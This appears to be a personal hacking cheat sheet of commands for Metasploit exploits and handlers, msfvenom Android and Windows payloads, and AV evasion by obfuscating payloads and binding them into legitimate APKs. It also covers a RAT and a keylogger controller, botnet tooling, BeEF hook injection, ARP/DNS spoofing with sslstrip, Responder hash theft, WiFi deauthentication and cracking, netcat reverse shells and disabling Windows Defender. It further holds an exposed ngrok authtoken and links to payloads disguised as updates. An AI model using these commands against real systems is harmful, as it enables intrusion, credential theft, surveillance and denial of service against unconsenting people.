PAYLOAD => windows/metsvc_bind_tcp
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) > set RHOST 192.168.1.104
RHOST => 192.168.1.104
msf exploit(handler) > show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/metsvc_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LPORT     31337            yes       The local port
   RHOST     192.168.1.104    no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > exploit
 



**************************************************************************************************
# how to use fake windows login screen










*******************************************************************************************************
how to use xencrypt 

this tool encodes powershell commandsand or payloads

Usage "this tool is for windows it needs powershell to run"

Import-Module ./xencrypt.ps1
Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1

You will now have an encrypted xenmimi.ps1 file in your current working directory. You can use it in the same way as you would the original script, so in this case:

Import-Module ./xenmimi.ps1
Invoke-Mimikatz

It also supports recursive layering via the -Iterations flag.

Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100




********************************************************************************
see apache2 logs 

cat /var/log/apache2/access.log

tail -f /var/log/apache2/access.log

**********************************************************************************************************
how to use apk
wash

"make a washed apk for msf"
./apkwash -p android/meterpreter/reverse_https LHOST=10.0.0.66 LPORT=443 -o LegitAndroidApp.apk







*******************************************************************************
How To Use APK TOOL "and make less detectable msfvenom apk payloads


apktool d -f test.apk   "to decomplie a apk file"

apktool b -f test       "to recompile a file dir to a apk again"





#NOTE
"to make a less detectable msfvenom apk payload goto the samli file and change all the words of metasploit to something else this is found in /TEST/smali/com/metasploit/stage/ modify all files in the dir"

use "sed -i 's/metasploit/legit/g' *" to change the metasploit words


use "cat * | grep metasploit"  to check if it worked if it worked no code should appare after the command is entered complie the payload like this for a less detecable msfvenom apk


then recompile the dir made by apktool

if you want to make a even better payload bind the new lwaa detectable payload to a real working legit apk to do so decompile a legit apk you can download these online try www.pureapk.com make a payload dir inside the legit apk it must be in the /smali/com/ dir of the legit apk make a dir named legit and inside that make a dir stage now copy all of the new msfvenom apk code aka files from the stage dir from the msfvenom payload to the legit apk file in the stage dir you made

use "cp /root/test/smali/com/stage/* stage/" make sure they are in the legit apks folder this can be down with terminal commands or mannually 

now we must edit the android menifest we can change permissions to make the install process look less malicious by removing some premissions but we will lose some commands we can change the permissions discriptions we also need to set it up so our payload runs with a hook

"gedit AndroidManifest.xml" to edit the manifest

look for the words main and luncher in the <activity> </activity> brackets



use jarsigner to sign the apk
use this command to sign the apk this helps avoid av and  other detection systems 
"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/test .keystore /root/test.apk"

#make a msfvenom apk payload 
msfvenom -p android/meterpreter/reverse_https LHOST=10.0.0.66 LPORT=443 R > /root/test.apk
*************************************************************************************

Shellsploit 

show     "show and a input to list the options"



show injectors

use injectors/Windows/BFD/Patching

show options

set port 443

set host 10.0.0.66

set file /root/putty.exe

inject 


*************************************************************************************************************************88
bettercap useage "use brideg connect or usb wifi chipset"

"help list"
bettercap -h or run bettercap and type help


"turn on modules"
dns.spoof on    " set dns.spoof.domains *  " 

net.sniff on

http.proxy on


"turn on multi modules"

any.proxy on
http.proxy on
https.proxy on
tcp.proxy on
net.sniff on
net.probe on
arp.spoof on
packet.proxy on
dns.spoof on


"wifi recon and hacking" 

wifi.recon on
wifi.show
set wifi.recon.channel 1                     "sets channel you want to focus on"
set net.stiff.verbose true                   "sets verbose mode for net sniff"
set net.sniff.filter ether proto 0x888e      "filters traffic looked at"
set net.sniff.output wpa.pcap                "sets output file"
net.sniff on
wifi.deauth 48:5d:36:07:77:84               "deauth attacks aka dos atacks a wifi based on mac address use wireshark to look at pcap file"



"sslstrip"

set https.proxy.sslstrip true   "turns on ssl strip"

bettercap --proxy-module NAME -h


"MITM attack a single target start modules for more info spoofing sniffer and http-proxy modules"
bettercap -T 192.168.1.215 --proxy -P POST  


"to pick a interface to listen with"
bettercap -iface eth0 or wlan0 


"turn on ssl strip"
set https.proxy.sslstrip true
set http.proxy.sslstrip true


"inject beef hook"
set http.proxy.script caplets/beef-inject.js
set https.proxy.script caplets/beef-inject.js

set http.proxy.sslstrip true
set https.proxy.sslstrip true

http.proxy on
https.proxy on
arp.spoof on


"how to dns spoof"

dns.spoof on
arp.spoof on 
set arp.internal true

set dns.spoof.address 192.168.1.218
set dns.spoof.domain espn.com
set dns.spoof.all true

"make hosts file"
leafpad dns.conf

"sniff passsowrds"
bettercap -caplet caplets/local-sniffer.cap



"js injection inject beef hook to one target"
bettercap -T 192.168.1.215 --proxy-module --js-url "https://192.168.1.218:3000/hook/js"

"js inject beef hook all devices"
bettercap -I eth0 --proxy-module injectjs --js-url "http://192.168.1.218:3000/hook.js"


    InjectJS ( --proxy-module injectjs ) : Used to inject javascript code/files inside HTML pages.
    InjectCSS ( --proxy-module injectcss ) : Used to inject CSS code/files inside HTML pages.
    InjectHTML ( --proxy-module injecthtml ) : Used to inject HTML code inside HTML pages.

HTTP/HTTPS proxy modules might want additional command line arguments, it's always a good idea to look at their specific help menus:



*********************************************************************************************************
#how to use nxcrypt

git clone https://github.cim/Hadi999/NXcrypt.git

"goto the nxcrypt folder and make msfvenom payload inside the nxcrypt folder"

msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.212 LPORT=443 -o test.py

msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 -o test.py

you may have to chmod +x the NXcrypt script"
python NXcrypt.py --file=test.py --output=encryptedtest.py

"enter a password to unlock encryption when asked"


use metasploit to handle payload use encoded stagers and https or rc4 payloads for max av evasion"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit



**********************************************************************************
#how to use chaos Framwork fud payload maker

#installation
apt install golang xterm git upx-ucl -y

git clone https://github.com/tiagorlampert/CHAOS.git

sudo apt install golang git -y

*go get github.com/kbinani/screenshot && github.com/lxn/win* "Use This Command the run script"

go get github.com/lxn/win

go get github.com/matishsiao/goInfo

go get golang.org/x/sys/windows

cd ~/go/src/github.com/tiagorlampert/CHAOS


# Run
cd CHAOS

go run main.go  "or"   go run CHAOS.go


#usage


***********************************************************************************************
# how to clone a website with wget

wget -mk https://www.google.com/




*****************************************************************************************************

#how to use rdp " remote desktop "

rdesktop 192.1868.1.123   " -u sets user -p sets pass"


#enable rdp via meterpreter shell "run getgui -h "opens help list"

run getgui -e -u admin -p admin  "run the script with the right user name and password or enter one this script will create a user name and pass for you just enter the info you want to be tthe user and pass"

ex:    getgui -e -u admin -p 12345       "this will turn on rdp and use these passwords you must have a meterpreter shell run these commands in the shell





#########################################################################
how to use ssl strip and arpsoof

echo 1>/proc/sys/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

route -n

nmap -sS -O ,gateway IP>/24

arpspoof -i <eth0> <192.168.1.234> -r <192.168.1.1>

sslstrip -l 8080

cat sslstrip.log    "to see captured data like logins"





###################################################################


#dnschef

dnschef --fakeip=192.168.1.220 --fakedomains=espn.com,google.com --nameservers=8.8.8.8 


dnschef --fakeip=192.168.1.220 --fakedomains=espn.com,google.com --interface 192.168.1.220

********************************************************************************************************
#how to use / login ftp

apt-get install ftp -y

ftp 10.0.0.139

"may need password"


***********************************************f**************************************************************
#how to use ssh

ssh msfadmin@10.0.0.139 22

"may need password"


**************************************************************************************************************
#how to use Telnet

telnet 10.0.0.139

"may need password"


*****************************************************************************************
#upgrade cmd shell to meterpreter

use post/multi/manage/shell_to_metrpreter

set SESSION 1

show options 

exploit

*************************************************************************************
how to man in the middle with netsniff-ng

netsniff-ng -D  "shows dif types of caputres"

netsniff-ng --in eth0 --out dump.pcap -s -T 0xa1b2c3d4 --bind-cpu 0 tcp or udp     "start sniffing"

ctrl C    "to stop attack and see data" 


tcpdump -tttt -r ./dump.pcap   "veiw pcap file and its data"

tcpdump -tttt -r ./dump.pcap |less -S  "make file more readable"

tcpdump -tttt -nn -r ./dump.pcap   "shows just ips and ports and flags"



*********************************************************************************************
how to install mitmf 

apt-get install mitmf -y

"fix erorrs and twisted issues"

apt-get install twisted

apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file

pip uninstall twisted 

pip install twisted==15.5.0

#and method to install mitmf
go to git clone page for more info

git clone https://github.com/byt3bl33d3r/MITMf.git

pip install reqirements.txt

python mitmf.py



************************************************************************************************************************
#how to use mitmf for man in the middle atacks


"inject beef hook"
mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.226 --inject --js-url http://192.168.1.212:3000/hook.js


"inject whole lan"
mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --inject --js-url http://192.168.1.212:3000/hook.js


"inject a html file"
mitmf --inject --html-file /root/inject.html --spof --arp --gateway 10.0.0.1 -i eth0




*******************************************************************************************************************
#start servers

service apache2 start

php -S 0.0.0.0:80 -c /root/   "the -c can be used to choice what file to host"


python -m SimHTTPServer "run this to host the dir you are currently in"



********************************************************************************
#how to use ngrok 

first sign up at ngroks website and get your auth token

download and unzip ngrok


cd ngrok

./ngrok authtoken <your token> 

./ngrok tcp 443

./ngrok http 80

./ngrok --help


"for mutli tunnels save this in the .ngrok2 file as ngrok.yml file"


authtoken: 442y34JP8fW3L23ANhqQK_6dGp1n7airK5hxAzaZwEY
tunnels:
 first-app:
        addr: 80
        proto: http
 second-app:
        addr: 3000
        proto: http

start the file with    ./ngrok start --all



*************************************************************************************
how to use serveo net https://serveo.net/

Manual
Basic use

    ssh -R 80:localhost:3000 serveo.net

The -R option instructs your SSH client to request port forwarding from the server and proxy requests to the specified host and port (usually localhost). A subdomain of serveo.net will be assigned to forward HTTP traffic.
Request multiple tunnels at once

    ssh -R 80:localhost:3000 -R 80:localhost:9999 serveo.net

The target server doesn't have to be on localhost

     ssh -R 80:example.com:80 serveo.net

Request a particular subdomain

The subdomain is chosen deterministically based on your IP address, the provided SSH username, and subdomain availability, so you'll often get the same subdomain between restarts. You can also request a particular subdomain:

    ssh -R incubo:80:localhost:8888 serveo.net
    ssh -R incubo.serveo.net:80:localhost:8888 serveo.net

Change the SSH username to get assigned a different subdomain:

    ssh -R 80:localhost:8888 foo@serveo.net
    ssh -R 80:localhost:8888 -l foo serveo.net

SSH forwarding

Request forwarding for port 22, and serveo.net will act as a jump host, allowing you to conveniently SSH into your machine (a unique alias is required):

    ssh -R myalias:22:localhost:22 serveo.net

Then you can establish an SSH connection using serveo.net as an intermediary like this:

    ssh -J serveo.net user@myalias

The -J option was introduced in the OpenSSH client version 7.3. If you have an older client, you can use the ProxyCommand option instead:

    ssh -o ProxyCommand="ssh -W myalias:22 serveo.net" user@myalias

Generic TCP forwarding

If you request a port other than 80, 443, or 22, raw TCP traffic will be forwarded. (In this case, there's no way to route connections based on hostname, and the host, if specifed, will be ignored.)

    ssh -R 1492:localhost:1492 serveo.net

If port 0 is requested, a random TCP port will be forwarded:

    ssh -R 0:localhost:1492 serveo.net

Connect on port 443

In some environments, outbound port 22 connections are blocked. For this reason, you can also connect on port 443.

    ssh -p 443 -R 80:localhost:8888 serveo.net

Keep the connection alive

Use ServerAliveInterval to prevent an idle connection from timing out:

    ssh -o ServerAliveInterval=60 -R 80:localhost:8888 serveo.net

Automatically reconnect

Use autossh for more persistent tunnels. Use "-M 0" to disable autossh's connectivity checking (rely on ServerAliveInterval and ServerAliveCountMax instead):

    autossh -M 0 -R 80:localhost:8888 serveo.net

See https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-autossh/ for more about autossh.
GUI

Pressing g will start a GUI session. Use up and down arrow keys to inspect requests/responses, and left and right arrow keys to switch between request and response views. Use j, k, u, d, p, and n to scroll the lower inspector pane. Press r to replay the selected request. Press h or ? at any time for help.
Custom Domain

To use your own domain or subdomain, you'll first need an SSH key pair. Use the ssh-keygen program to generate a key pair if you don't already have one.

Next, use ssh-keygen -l and note your key's fingerprint. Here's an example output:

    2048 SHA256:pmc7ZRv7ymCmghUwHoJWEm5ToSTd33ryeDeps5RnfRY no comment (RSA)

In this example, the fingerprint is SHA256:pmc7ZRv7ymCmghUwHoJWEm5ToSTd33ryeDeps5RnfRY.

Now you need to add two DNS records for the domain or subdomain you'd like to use:

    An A record pointing to 159.89.214.31.
    For each SSH key to allow, a TXT record in the form of authkeyfp=[fingerprint]. For the example key above, the DNS record would be authkeyfp=SHA256:pmc7ZRv7ymCmghUwHoJWEm5ToSTd33ryeDeps5RnfRY.

Once your DNS records are in place, you can request your subdomain/domain from Serveo:

    ssh -R subdomain.example.com:80:localhost:3000 serveo.net

When you request port forwarding for subdomain.example.com, Serveo will fetch the TXT records from your DNS server and only allow forwarding if you've provided a public key with the same fingerprint as specified in TXT records.

***************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
#Install Teamviewer


first download teamviewer from thier website


apt-get -f install
apt-get update
apt-get -f install
dpkg --printforegin-architectures
dpkg -add-architectures i3886
dpkg -i teamviewer_13.2.26559_amd64.deb
apt-get -f install
apt-get update
apt-get -f install
dpkg -i teamviewer_13.2.26559_amd64.deb



*************************************************************************************
how to use parat

generate -i 10.0.0.16 -p 443 -o RAT

your malware will be in the parat outpout file




********************************************************************************************************************************************
how to change your mac address using mac changer

macchanger --help         "help list"

macchanger eth0 -s        "shows your current mac addrress"

macchanger eth0 -m        "change mac to a custom mac address if you use the same as a device on a paid wifi you can use that wifi free"

macchanger eth0 -A        "change to a random mac address with vender section encluded use -a vendor of same type"

macchanger eth0 -r        "fully random mac vendor and all"

macchanger eth0 -p        "reset mac address to origanl"

"ito make sure the mac address changed reset the network manager"
a
ifconfig eth0 up                        

service network-manager restart         "restart network manager to change the mac"



***********************************************************************************************************
#How to set up proxychains

apt-get install tor

nano /etc/proxychains.conf

uncomment dynamic chain

uncomment Proxy DNS requests
add tor proxy to prxy list

socks4	127.0.0.1 9050
socks5	127.0.0.1 9050

service tor start 

proxychains msfconsole

proxychains nmap -t4 -A -v 10.0.0.1/24

proxychains firefox www.google.com




***************************************************************************
how to use Nipe to anon your system

cd nipe

    perl nipe.pl install                    "installs nipe"
    perl nipe.pl start                      "starts nipe"
    perl nipe.pl stop                       "stops nipe"
    perl nipe.pl restart                    "restarts nipe"
    perl nipe.pl status                     "status of nipe"


*****************************************************************************************************************************
how to get a VPN on linux anon your system

#go to www.vpnbook.com download a vpn certificate 

#run it via termainl with the VPN cert name and the command "open vpn"
#use username and pass from openvpn.com the username is vpnbook password is an4d7bm



*******************************************************************************************************
clone a website with wget

wget -mk www.basicwebsiteexample.com/          "clones the whole site"


****************************************************************************************************
nmap commands and netdiscover for scanning the LAN

nmap -sn               "ping scan"

nmap -T4 -F            "quick scan"

nmap -T4 -A -v         "intense scan"

netdiscover -i eth0    "scan the interface eth0 for devices"

***************************************************************************************
how to use empire

listeners

uselistener http

help

info

set Name Payloadsforlife

set Port 8080

execute

launcher powershell


"after getting a shell"

agents

interact "agents name"

info

help

usemodule


***********************************************************************************
how to use hatkey key logger 

 Command  Description                          
 -------  -----------                          
 exit     Exit the console                     
 list     List all agents                      
 kill     Kill an agent                        
 run      Run Command and Controler            
 help     Help menu                            
 set      Sets a variable to a value           
 show     Show Command and Controler variables 
HatKey > list
 ID  IP  Username 
 --  --  -------- 
HatKey > show
 Name  Current Setting  Required  Description                          
 ----  ---------------  --------  -----------                          
 host                   True      The Command and Controler IP address 
 port  8080             True      The Command and Controler port       
HatKey > set host 10.0.0.15
HatKey > run





***************************************************************************
how to use embedinHTML

python embedInHTML.py  -k data -f '/root/putty.exe' -o fileshare.html


"if mime type fails use -m/--mime"

python embedInHTML.py -m/--mime  -k data -f '/root/encryptedtest.py' -o fileshare.html

python embedInHTML.py -m/--mime  -k data -f '/root/showbox.apk' -o index.html



 " -f is file path"   " -o is output for files name "


*************************************************************************************************************
#how to use UFONET

./ufonet -h              "help menu"



./ufonet --download-zombies            "download zombies"



./ufonet --gui     "get gui version"



./ufonet --sd /botnet/dork.txt --sn bing         "get more zombies"
***************************************************************************************************

#Veil Evasion + Phantom Evasion Custom Payload 

in Veil

use 2

use 4

set BadChars \x00\x0a

set Encoder xor

set LHOST 10.0.0.15

set LPORT 443

generate


"in Phantom"

1

4 or windows paylaod of your choice

2

********************************************************************************************************
#how to use Unicorn
#how to make a fud powershell payload with metasploit hack windows 7,8 and 10 start uncorin by going to its folder and running the program with ./unicon.py then type


./unicorn.py windows/meterpreter/reverse_tcp 192.168.1.236 443   "generate a fud powershell payload with unicon"


add "hta" at the end of the script to make a web deleivery based attack.



**********************************************************************************************************
#how to use responder "to capture admin password hasses and other password very easy""see reposnder rules to get more passwords

responder -help

responder -I eth0 -wv      grab admin username and password from a windows network

responder -I eth0 -b      for basic http "clear text" return

responder -I eth0 -wrFb    for login password grabbing login box on the internet

hashes are stored in usr/share/responder/logs   

#then use john to crack hashes

to use john type john "file name"

#then use psexe to exploit the device with the username and password you found.

use exploit/windows/smb/psexec

set PAYLOAD windows/meterpreter/reverse_tcp

set SMBUSER 

set SMBPASS

set SMBDOMAIN

set LHOST 10.0.0.16

set RHOST 

set LPORT 443

exploit


***************************************************************************************************************************

how to change mac address

ifconfig wlan0 down

ifconfig wlan0 up

ifconfig wlan0mon0 down

macchange --help

macchanger -r wlan0

macchanger -m 00:11:22:33:44:55

ifconfig wlan0mon0 up

ifconfig wlan0 up


*************************************************************************************************************

harvest e-mails

theharvester

theharvester -d gmail.com -b google -l 100

theharvester -d gmail.com -b all -l 500    "gain emails"


thehavster -d msn.com -b bing -c    "dns brute fouce attack"


theharvester -d cisco.com -b google    "for host name searchers and related info
 

*****************************************************************************************
#boot user from wifi using hping dos attacks

hping3 -S --flood -V "traget lan ip"


#boot user from wifi

hping3 -S --floof -V "traget lan ip"




"or use aireplay-ng"

airdumo-ng wlan0mon  "scan for networks and gain info"

"dos attack a whole network"
aireplay-ng -0 0 -a 70:F2:20:2D:8E:E1 wlan0mon

aireplay-ng --deauth 20000 -a "place mac of access point" -c "place mac of client you want kicked off" wlan0mon



"dos attack just one device"
aireplay-ng -0 0 -a 78:F2:9E:6F:B1:E8 -c 40:4E:36:0C:26:1C wlan0mon

aireplay-ng -0 0 -a mac of router -c mac of target wlan0mon



#or start monitormode 
"set channel of chipset"
airmon-ng wlan0mon 6  "replace number with channel you want"

 airmon-ng start wlan0mon

 type airmon-ng airmon-ng check airmon-ng kill airmon-ng start wlan0mon

#scan local networks traffic


#listen to only one network
airodump-ng --channel 6 --bssid 78:F2:9E:6F:B1:E8 wlan0mon          "must replace mac and bssid with wifi network target station"


"or use evillimiter"

?  "for help"

scan   "start a scan"


hosts   "to find host from scan of network"


block 4     "use number to pick target block cuts all traffic you can also limit traffic"

limit 4      "limits traffic"


block all    "blocks all traffic dos attack"


free all   "stops all attack"

****************************************************************************************************
#use kismet to gain network info or netdiscover macs and ip address also airodump

netdiscover -i eth0

kismet -i eth0


*******************************************************************************************************************************************

#hack wifi

"set channel of chipset"
airmon-ng wlan0mon 11  "replace number with channel you want"

"shows all networks in area and info"
airodump-ng wlan0mon


"focus on a certain channel to listen to shows macs device on that network" 
airodump-ng -c 6 -w  HOME-42B6-2.4 --bssid 78:F2:9E:6F:B1:E8 wlan0mon


"now deauth a client and capture a handshake use mac of router for bssid"
aireplay-ng -0 0 -a 78:F2:9E:6F:B1:E8 wlan0mon


"after 4 way handshake is caputred crack the hash with aircrack"
aircrack-ng -w /root/PasswordList.txt Fios-TechSureUserLog-5G-01.cap




***************************************************************************************************
#start wifi hacking
airodump-ng "SSID" -c "channel" --bssid "mac of target" wlan0mon

#scan for networks 
aireplay-ng -9 wlan0mn

#Start wifi hacking try for handshake
aireplay-ng --deauth 10 -a "place mac address of target" -c "mac of station number" wlan0mon

#now try to crack handshake if captured
aircrack-ng -w Drag wordlist to termianl for exact location path" -b "then mac under 2Nd bssid" "then drag cap file into terminal"

#check for unathenticated clients 
sudo airodump-ng --channel 2 --encrypt OPN wlan0mon

#how to boot people off the network
aireplay-ng -0 15 -a "mac address" -c Mac address" wlan0mon -0

"make 15 a 0 for unlimite death pakets"

#set channel of fake router
iwconfig wlan0mon channel 1

*************************************************************************************************************************************

#make Fake Networks appare
#becon flood 

mdk3 wlan0mon b -c 1         "make one fake network show up"

mdk3 wlan0mon b -c 1 -f         

mdk3 wlan0 b -c 1 -f       "to make fake random wifis show up add a txt file to make it say names you want"
"  

mdk3 wlan0 b -c 1 -f '/root/Back Up Data/Fake Network Name List' 


*****************************************************************************************
#Basic Man In The Middle Attack With Terminal using Ettercap


echo 1 > /proc/sys/net/ipv4/ip_forward            "set up ip forwarding"

arpspoof -i eth0 -t 10.0.0.89 10.0.0.1  "target to gateway"

arpspoof -i eth0 -t 10.0.0.1 10.0.0.89  "gateway to target"

dnsspoof -i eth0 -f host.txt        "make a host file to use for dns spoofing"
 
or 

gedit /etc/ettercap/etter.dns   "to etdi ettercaps host file"

ettercap -i eth0 -T -q -P dns_spoof -M ARP /192.168.1.212// 

***************************************************************************
#how to use Driftnet and ettercap to scan the network for images and arp posion
you can use ettercap gui as well with man in the middle attack


to ethernet link off


ettercap -Tqi wlan0 -M arp:remote ///        "starts ettercap"




driftnet -i wlan0        "starts driftnet"


*******************************************************************************************************************************
start tcpdump to capture datawith man in the middle attack

tcpdump -i wlan0 -n port 80 and host 10.0.0.30



#set up ip forwarding for ettercap 

sysctl -w net.ipv4.ip_forward=1



#edit ettercap files 

nano /etc/ettercap/etter.conf       "ettercap config file"

nano /etc/ettercap/etter.dns        "ettercap host file"



#use ettercap dns spoof in termianl 

ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof //10.0.0.1// //10.0.0.30//


****************************************************************************************
#Beef XXS NOTES

#get meterpreter shell from beef

goto in beef exploits/localhost/javaplayload   "connect back host 10.0.0.15"

use multi/handler

set PAYLOAD java/meterpreter/reverse_tcp

set LHOST 10.0.0.170

set LPORT 6666



#link for social enginering pop up beef 


#Android Shell WLAN http://71.58.122.35:12345/www.%2FPlug+Ins         

#Android metapreter WLANHTTP http://71.58.122.35:12345/www.%2Fapks%2FWLANHTTP

#Android shell LAN http://10.0.0.89:12345/www.%2FUpdatePlugin

#Android Metapreter LANHTTP http://10.0.0.89:12345/www.%2Fapks%2FLANHTTP

#windows shell LAN http://10.0.0.89:12345/www.%2FUpdate

#Windows Shell WLAN http://71.58.122.35:12345/www.%2FYoutubePlugIn

#windows shell payload exe
http://71.58.122.35:12345/www.%2FWindowsupdate


#beef hooks
<script src="http://Public IP Addreess:3000/hook.js" type"text/javascript"></script><Script Language='Javascript'>


<script src="http://10.0.0.225:3000/hook.js" type"text/javascript"></script><Script Language='Javascript'></script>


<script src="http://<IP>:3000/hook.js"></script>


"edit Beef File you can add your ip add tools etc"

cd /usr/share/beef-xss 

leafpad config.yaml

cd /usr/share/beef-xss/extensions/metasploit/

leafpad config.yaml


****************************************************************************************************************************************
#metasploit must knows

show targets     "shows targets when in a exploit"

search   "search exploit or android windows anything"

show options     "show settings needed for a exploit"

****************************************************************************
#android exploits for metasploit

use exploit android/broswer/stagefright_mp4_tx3g_64bit

set TARGET 0

set PAYLOAD generic/shell_reverse_tcp

set LPORT 4444

set LHOST 10.0.0.170

set ExitOnSession false

set SSL false

set DisablePayloadHandler false

set SRVHOST 0.0.0.0

set SRVPORT 8080

exploit -j




use exploit android/broswer/webveiw_addkjavascriptinterface

set TARGET 0

set PAYLOAD generic/shell_reverse_tcp

set LPORT 4444

set LHOST 10.0.0.170

set Retries true

set ExitOnSession false

set DisablePayloadHandler false

set SRVHOST 0.0.0.0

set SRVPORT 8080

exploit -j




use exploit android/broswer/samsung_knox_smdm_url

set TARGET 0

set PAYLOAD generic/shell_reverse_tcp

set LPORT 4444

set LHOST 10.0.0.170

set APK_VERSION 1337

set Retries true

set ExitOnSession false

set SRVPORT 8080

set SRVHOST 0.0.0.0

exploit -j







use exploit/android/adb/adb_server_exec

set PAYLOAD generic/shell_bind_tcp

set LHOST 10.0.0.170

set LPORT 4444

set WritableDir /data/local/tmp/

set RPORT 8889

set SRVPORT 8080

set SRVHOST 0.0.0.0

set RHOST 10.0.0.89

exploit


#LOCAL

use exploit/android/local/put_user_vroot
msf exploit(put_user_vroot) > set TARGET 0
TARGET => 0
msf exploit(put_user_vroot) > set PAYLOAD generic/shell_reverse_tcp
PAYLOAD => generic/shell_reverse_tcp
msf exploit(put_user_vroot) > set LHOST 10.0.0.170
LHOST => 10.0.0.170
msf exploit(put_user_vroot) > set LPORT 4444
LPORT => 27042
msf exploit(put_user_vroot) > set ExitOnSession false
ExitOnSession => false
msf exploit(put_user_vroot) > set DisablePayloadHandler false
DisablePayloadHandler => false
msf exploit(put_user_vroot) > exploit -j

set RHOST 10.0.0.89
#PDF

use exploit/android/fileformat/adobe_reader_pdf_js_interface

 set TARGET 0

msf exploit(adobe_reader_pdf_js_interface) > set PAYLOAD generic/shell_reverse_tcp

msf exploit(adobe_reader_pdf_js_interface) > set LHOST 10.0.0.170

msf exploit(adobe_reader_pdf_js_interface) > set LPORT 8889

msf exploit(adobe_reader_pdf_js_interface) > 


msf exploit(adobe_reader_pdf_js_interface) > set PDF::Obfuscate true

msf exploit(adobe_reader_pdf_js_interface) > set ExitOnSession false

msf exploit(adobe_reader_pdf_js_interface) > set PDF::Method DOCUMENT

msf exploit(adobe_reader_pdf_js_interface) > set FILENAME Doller General.pdf

msf exploit(adobe_reader_pdf_js_interface) > set PDF::Encoder ASCIIHEX

msf exploit(adobe_reader_pdf_js_interface) > set DisablePayloadHandler false

set RHOST 10.0.0.89

msf exploit(adobe_reader_pdf_js_interface) > exploit -j



#LOCAL

use exploit/android/local/futex_requeue
msf exploit(futex_requeue) > set TARGET 0
TARGET => 0
msf exploit(futex_requeue) > set PAYLOAD generic/shell_reverse_tcp
PAYLOAD => generic/shell_reverse_tcp
msf exploit(futex_requeue) > set LHOST 10.0.0.170
LHOST => 10.0.0.170
msf exploit(futex_requeue) > set LPORT 26836
LPORT => 26836
msf exploit(futex_requeue) > set ExitOnSession false
ExitOnSession => false
msf exploit(futex_requeue) > set DisablePayloadHandler false
DisablePayloadHandler => false

set RHOST 10.0.0.89

msf exploit(futex_requeue) > exploit -j



**************************************************************************************
#START Ecoded HANDLER / options
1. Handler
msf> use multi/handler

2. set payload
msf exploit(handler) > set PAYLOAD android/meterpreter/reverse_tcp

3. Set local port
msf exploit(handler) > set LPORT 4444

4. Set local host
msf exploit(handler) > set LHOST 10.0.0.170

set ECODING 

set EXITONSESSION false

set LITERATIONS 15


5. 
msf exploit(handler) > exploit

*********************************************************************************
#IPHONE HACK BROWSER EXPLOIT ATTACK


use exploit/apple_ios/browser/safari_libtiff

set TARGET 0

"you can use multi playoads with this explit as with many msf exploits and remote access files from msfvnom"

set PAYLOAD apple_ios/aarch64/meterpreter/reverse_tcp

set PAYLOAD osx/x86/vforkshell/reverse_tcp

set PAYLOAD oxs/armle/execute/reversetcp

set LHOST 10.0.0.170

set LPORT 4444

set ExitOnSession false

set SRVPORT 8080

set SSL false

set DisablePayloadHandler false

set SRVHOST 0.0.0.0

exploit -j


********************************************************************************

#netcat notes
netcat  "command live version


nc     "nmap version"

nc -h   "list all commands"


port scan     -zvn 10.0.0.30 1-1000

                                          "IP Address and PORT"
connect to open ports          netcat -vn 10.0.0.30 445     


spawn a server on a port on windows      ncat -nlvp 8080 -e cmd.exe


connect directly to spawned a server from linux   nc -nv "IP Adress" 8080


connect with reverse shell to spawned server from linux  nc "IP Adrress" 8080 -e /bin/bash

                               netcat
spawn server to send file      ncat -nlvp 8080 > "filename.exe"


                               netcat
send file to spwaned server    ncat "IP Address" 8080 < "filename.exe"

spawn a linux server      "netcat -lvp 1122 -e /bin/sh

connect to spwaned linux server nc -nc 10.0.0.89 1122 -e /bin/sh

make linux lister for reverse shell    nc -nvlp 443

connect with windows to reverse shell to linux   ncat -nv 10.0.0.170 443 -e cmd.exe



#NOTE can be used with port forwarding

*****************************************************************************


#COMMAD PROMPT SHELL COMMANDS

"Press"
F1 , F2 , F3 ,F5  "paste last executed command in diffrent ways"

F7  , F8  " shows past exe commands"




ncat or Netcat or nc  "checks for netcat"

dir    "displays a list of a folder files and subfiles"

attrib     Changes files read write hidden status"

tasklist

tasklist/APPS       "see all programs and or process running"

get-process

taskkill /PID 5812 /F   "kill a task use proper pid"

bootcfg   "motify boot file"

cd     "show current dir"

copy    "copy a file"

del   "delete a file"

RmDir    or RMDIR /S  "delete a dir"

echo  "used to show a message"

move   "move a file

start    "start a application  or new command window"

systeminfo   "get sys info"

hostname   "shows pc name"

logoff  "log user off"

shutdown    "shutdown pc

shutdown -r   "restart pc"

shutdown -i "brings up prompt"

telnet

arp -a    "get a ip interface list of the network pc, subnet, etc"

ipconfig

ping       "you can use ping to find other host on the network"

tracert     "trace route

tracerpt

net

netsh

netstat

route  "change routing tables"

sc stop WinDefend    "stop windows defender"

sc start WinDefend    "start windows denfender"


sc config WinDefend start= disable      "stop windows defender"
sc start WinDefend


sc config WinDefend auto=                "start windows denfender"
sc stop WinDefend


powercfg   "manager power setting like sleep"

type  "shows contents of a text file

edit   "edit a txt file"

tree   "graphicaly displays dir stucture of a folder or drive"

deltree   "delete a whole dir EVERYTHING"

net user    "to see all users on pc and thier hostnames"


netsh wlan show profiles             "see all wifi pc ever connected too "must be admin"


